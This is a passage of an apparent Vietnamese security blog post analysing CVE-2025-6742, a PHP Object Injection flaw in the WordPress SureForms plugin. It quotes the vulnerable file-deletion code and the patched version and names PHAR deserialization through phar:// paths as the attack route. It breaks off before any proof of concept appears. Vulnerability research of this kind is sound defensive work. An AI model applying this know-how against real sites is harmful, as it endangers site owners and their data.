<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-6742 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress SureForm Plugin."><meta name="keywords" content='analyst, plugin, php object injection'>
  <meta itemprop="name" content="CVE-2025-6742 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress SureForm Plugin.">
  <meta itemprop="datePublished" content="2025-11-19T19:00:00+07:00">
  <meta itemprop="dateModified" content="2025-11-25T21:12:53+07:00">
  <meta itemprop="wordCount" content="2059">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-11-19-cve-2025-6742/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Php Object Injection"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-6742 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress SureForm Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-19T19:00:00+07:00">
    <meta property="article:modified_time" content="2025-11-25T21:12:53+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Php Object Injection">
    <meta property="og:image" content="http://localhost:1313/posts/2025-11-19-cve-2025-6742/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-11-19-cve-2025-6742/app.png">
  <meta name="twitter:title" content="CVE-2025-6742 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress SureForm Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/" title="CVE-2025-6742 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-11-18-cve-2025-53572/" title="CVE-2025-53572 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2025-11-20-cve-2025-49386/" title="CVE-2025-53572 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-11-19-cve-2025-6742/index.md" title="CVE-2025-6742 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-6742 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-11-19-cve-2025-6742\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, php object injection","wordcount":  2059 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-11-19-cve-2025-6742\/","datePublished": "2025-11-19T19:00:00+07:00","dateModified": "2025-11-25T21:12:53+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress SureForm Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Đổi chủ đề" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-11-19-cve-2025-6742/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2025-11-19-cve-2025-6742/">English</option><option value="/vi/posts/2025-11-19-cve-2025-6742/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-25-cve-2025-3439/" title="CVE-2025-3439 Analysis &amp; POC">CVE-2025-3439 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-24-cve-2025-48134/" title="CVE-2025-48134 Analysis &amp; POC">CVE-2025-48134 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-23-cve-2025-30773/" title="CVE-2025-30773 Analysis &amp; POC">CVE-2025-30773 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-21-cve-2025-2939/" title="CVE-2025-2939 Analysis &amp; POC">CVE-2025-2939 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-20-cve-2025-49386/" title="CVE-2025-53572 Analysis &amp; POC">CVE-2025-53572 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-18-cve-2025-53572/" title="CVE-2025-53572 Analysis &amp; POC">CVE-2025-53572 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-17-cve-2025-49401/" title="CVE-2025-49401 Analysis &amp; POC">CVE-2025-49401 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-14-cve-2025-9083/" title="CVE-2025-9083 Analysis &amp; POC">CVE-2025-9083 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-28-cve-2025-9321/" title="CVE-2025-9321 Analysis &amp; POC">CVE-2025-9321 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-6742 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analysis/" class="post-category" title="Danh mục - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-11-19 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-19">2025-11-19</time></span>&nbsp;<span title="Cập nhật ngày 2025-11-25 21:12:53"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-25">2025-11-25</time></span>&nbsp;<span title="2059 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 2100 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>10 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-11-19-cve-2025-6742/app.png' alt="/posts/2025-11-19-cve-2025-6742/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
  </ul>

  <ul>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin <strong>The SureForms – Drag and Drop Form Builder for WordPress</strong> cho WordPress tồn tại lỗ hổng <strong>PHP Object Injection</strong> trong tất cả các phiên bản cho đến, và bao gồm, 1.7.3 thông qua việc sử dụng <strong>file_exists()</strong> trong hàm <strong>delete_entry_files()</strong> mà không có giới hạn đối với đường dẫn được cung cấp. Điều này cho phép kẻ tấn công chưa xác thực có thể inject một <strong>PHP Object</strong>. Không có <strong>POP chain</strong> nào được biết đến trong phần mềm dễ bị tấn công này, nghĩa là lỗ hổng này không có tác động trừ khi một plugin hoặc theme khác chứa <strong>POP chain</strong> được cài đặt trên site. Nếu một <strong>POP chain</strong> tồn tại thông qua plugin hoặc theme bổ sung được cài đặt trên hệ thống mục tiêu, nó có thể cho phép kẻ tấn công thực hiện các hành động như xóa file tùy ý, lấy dữ liệu nhạy cảm, hoặc thực thi code tùy thuộc vào <strong>POP chain</strong> hiện diện.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-6742"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-6742</a></li>
<li><strong>Vulnerability Type</strong>: PHP Object Injection</li>
<li><strong>Affected Versions</strong>: &lt;= 1.7.3</li>
<li><strong>Patched Versions</strong>: 1.7.4</li>
<li><strong>CVSS severity</strong>: High (7.5)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/sureforms/"target="_blank" rel="external nofollow noopener noreferrer">WordPress SureForm Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/"target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li><strong>Plugin Version</strong> - <strong>SureForm</strong>:
<ul>
<li><code>1.7.3</code> – <strong>vulnerable</strong></li>
<li><code>1.7.4</code> – <strong>patched</strong></li>
</ul>
</li>
<li><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ diff nào.</li>
</ul>
<h2 class="heading-element" id="cause"><span>Cause</span>
  <a href="#cause" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Trong phiên bản <code>1.7.3</code>, hàm <code>delete_entry_files()</code> nhận vào một <code>$file_url</code>, sau đó decode url và chuyển đổi thành đường dẫn bằng <code>$file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) );</code></p>
<p>Tiếp theo nó gọi trực tiếp:</p>
<div class="highlight" title="entries-list-table.php v1.7.3"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Delete the file if it exists.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="nx">file_exists</span><span class="p">(</span> <span class="nv">$file_path</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span> <span class="nv">$file_path</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Đoạn code này kiểm tra sự tồn tại của file bằng <code>file_exists()</code> và sử dụng <code>unlink()</code> để xóa nếu nó tồn tại.</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-19-cve-2025-6742/diff.png" title="Sự thay đổi trong bản vá" data-thumbnail="/posts/2025-11-19-cve-2025-6742/diff.png" data-sub-html="<h2>Diff</h2><p>Sự thay đổi trong bản vá</p>"><img loading="lazy" src='/posts/2025-11-19-cve-2025-6742/diff.png' alt="Diff" height="602" width="1892"></a><figcaption class="image-caption">Sự thay đổi trong bản vá</figcaption>
  </figure></p>
<p>Trong bản vá, đoạn code trên được thay thế bằng:</p>
<div class="highlight" title="entries-list-table.php v1.7.4"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Delete the file from the uploads directory.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Helper</span><span class="o">::</span><span class="na">delete_upload_file_from_subdir</span><span class="p">(</span> <span class="nv">$file_url</span><span class="p">,</span> <span class="s1">&#39;sureforms/&#39;</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight" title="helper.php v1.7.4"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">delete_upload_file_from_subdir</span><span class="p">(</span> <span class="nv">$file_url</span><span class="p">,</span> <span class="nv">$subdir</span> <span class="o">=</span> <span class="s1">&#39;sureforms/&#39;</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Decode the file URL.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$file_url</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span> <span class="nv">$file_url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if the file URL is empty.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$file_url</span> <span class="p">)</span> <span class="o">||</span> <span class="o">!</span> <span class="nx">is_string</span><span class="p">(</span> <span class="nv">$file_url</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Normalize and sanitize the subdirectory.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$subdir</span> <span class="o">=</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$subdir</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Get the base upload directory.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$upload_dir</span>       <span class="o">=</span> <span class="nx">wp_upload_dir</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$base_upload_path</span> <span class="o">=</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nv">$upload_dir</span><span class="p">[</span><span class="s1">&#39;basedir&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">.</span> <span class="nv">$subdir</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Extract only the filename from URL.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span> <span class="nv">$file_url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Construct the full file path.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$file_path</span> <span class="o">=</span> <span class="nv">$base_upload_path</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Resolve real paths.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$real_file_path</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span> <span class="nv">$file_path</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$real_base_path</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span> <span class="nv">$base_upload_path</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Security check: ensure file is inside the target subdir.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$real_file_path</span> <span class="o">||</span> <span class="o">!</span> <span class="nv">$real_base_path</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$real_file_path</span><span class="p">,</span> <span class="nv">$real_base_path</span> <span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Delete if file exists.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">file_exists</span><span class="p">(</span> <span class="nv">$real_file_path</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">unlink</span><span class="p">(</span> <span class="nv">$real_file_path</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hàm mới <code>delete_upload_file_from_subdir()</code> thực hiện nhiều bước kiểm tra bảo mật, chỉ cho phép xóa file nằm trong thư mục <code>uploads/sureforms/</code>, với tên file hợp lệ.</p>
<div class="details admonition info open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"></i>Theo như mô tả thì CVE này liên quan đến lỗ hổng PHP Object Injection mà sink ở đây là hàm <code>file_exists()</code> thì chỉ có xảy ra với trường hợp <strong>PHAR Deserialization</strong>, tức <code>$file_path</code> ở đây phải thuộc dạng <code>phar://phar_file</code>.</div>
  <div class="details-content">
    <div class="admonition-content"></div>
  </div>
</div><h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight" title="entries-list-table.php v1.7.3" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="hl"><span class="lnt"> 6
</span></span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="hl"><span class="lnt">22
</span></span><span class="lnt">23
